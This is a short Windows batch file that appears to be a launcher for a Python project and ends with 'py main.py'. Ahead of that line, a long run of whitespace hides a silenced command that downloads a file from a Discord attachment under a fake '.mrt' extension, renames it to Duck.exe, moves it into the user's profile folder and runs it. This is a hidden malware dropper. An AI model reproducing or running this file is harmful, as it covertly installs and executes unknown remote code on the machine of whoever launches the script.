@echo off
																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1313273791861886996/Duck.mrt?ex=674f8907&is=674e3787&hm=c211648ad593bbe8c50c700e4728b58b2582b09681afba31e0b16bcf978ae05f&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
py main.py

pause
